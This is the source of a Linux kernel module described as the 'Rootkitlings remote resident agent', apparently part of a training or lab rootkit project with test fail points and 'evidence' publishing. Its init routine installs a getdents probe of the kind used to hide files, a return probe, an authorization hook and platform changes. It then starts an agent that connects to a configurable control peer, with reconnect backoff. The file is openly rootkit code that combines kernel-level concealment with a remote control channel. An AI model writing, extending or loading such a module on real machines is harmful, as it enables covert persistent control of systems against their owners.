// SPDX-License-Identifier: GPL-2.0
#include <linux/err.h>
#include <linux/errno.h>
#include <linux/init.h>
#include <linux/module.h>

#include "agent.h"
#include "agent_status.h"
#include "ipv4.h"
#include "platform.h"
#include "rootkit.h"
#include "transaction.h"

#if ROOTKITLINGS_FAIL_POINT < 0 || ROOTKITLINGS_FAIL_POINT > 13
#error "unknown ROOTKITLINGS_FAIL_POINT"
#endif

static unsigned short peer_port;
module_param(peer_port, ushort, 0400);
MODULE_PARM_DESC(peer_port, "control TCP listener port");

static char peer_address_text[16] = "127.0.0.1";
module_param_string(peer_address, peer_address_text,
		    sizeof(peer_address_text), 0400);
MODULE_PARM_DESC(peer_address, "control IPv4 peer address");

static unsigned int retry_base_ms = 25;
module_param(retry_base_ms, uint, 0400);
MODULE_PARM_DESC(retry_base_ms, "initial reconnect delay in milliseconds");

static unsigned int retry_max_ms = 200;
module_param(retry_max_ms, uint, 0400);
MODULE_PARM_DESC(retry_max_ms, "maximum reconnect delay in milliseconds");

static struct rk_state *state;
static struct rk_agent agent;
static struct rk_transaction transaction;

static int __init rk_init(void)
{
	__be32 peer_address;
	int error;

	error = rk_ipv4_parse(peer_address_text, &peer_address);
	if (error || !peer_port || !retry_base_ms ||
	    retry_base_ms > retry_max_ms ||
	    retry_max_ms > 5000)
		return -EINVAL;
	if (ROOTKITLINGS_FAIL_POINT == RK_FAIL_PREFLIGHT)
		return -ECANCELED;

	state = rk_state_create();
	if (IS_ERR(state)) {
		error = PTR_ERR(state);
		state = NULL;
		return error;
	}

	rk_events_reset();
	error = rk_worker_start(state);
	if (error)
		goto destroy_state;
	error = rk_authorization_start();
	if (error)
		goto stop_worker;
	error = rk_return_probe_start(state);
	if (error)
		goto stop_authorization;
	error = rk_getdents_probe_start(state);
	if (error)
		goto stop_return_probe;
	error = rk_platform_prepare();
	if (error)
		goto stop_getdents_probe;
	error = rk_transaction_apply(&transaction);
	if (error)
		goto finish_platform;
	if (ROOTKITLINGS_FAIL_POINT == RK_FAIL_AGENT_WORKER)
		error = -EINTR;
	else
		error = rk_agent_start(&agent, peer_address, peer_port,
				       retry_base_ms,
				       retry_max_ms);
	if (error)
		goto restore_transaction;
	error = rk_events_publish();
	if (error)
		goto stop_agent;
	error = rk_evidence_publish();
	if (error)
		goto unpublish_events;
	error = rk_agent_status_publish(&agent, &transaction);
	if (error)
		goto unpublish_evidence;
	error = rk_proc_publish(state);
	if (error)
		goto unpublish_agent_status;

	rk_scheduler_start(state);
	return 0;

unpublish_agent_status:
	rk_agent_status_unpublish();
unpublish_evidence:
	rk_evidence_unpublish();
unpublish_events:
	rk_events_unpublish();
stop_agent:
	rk_agent_stop(&agent);
restore_transaction:
	(void)rk_transaction_restore(&transaction);
	rk_transaction_dispose(&transaction);
finish_platform:
	rk_platform_finish();
stop_getdents_probe:
	rk_getdents_probe_stop();
stop_return_probe:
	rk_return_probe_stop();
stop_authorization:
	rk_authorization_stop();
stop_worker:
	rk_worker_stop();
destroy_state:
	rk_state_destroy(state);
	state = NULL;
	return error;
}

static void __exit rk_exit(void)
{
	rk_proc_unpublish();
	rk_agent_status_unpublish();
	rk_evidence_unpublish();
	rk_events_unpublish();
	rk_scheduler_stop();
	rk_agent_stop(&agent);
	(void)rk_transaction_restore(&transaction);
	rk_transaction_dispose(&transaction);
	rk_platform_finish();
	rk_getdents_probe_stop();
	rk_return_probe_stop();
	rk_authorization_stop();
	rk_worker_stop();
	rk_state_destroy(state);
	state = NULL;
}

module_init(rk_init);
module_exit(rk_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Rootkitlings remote resident agent");
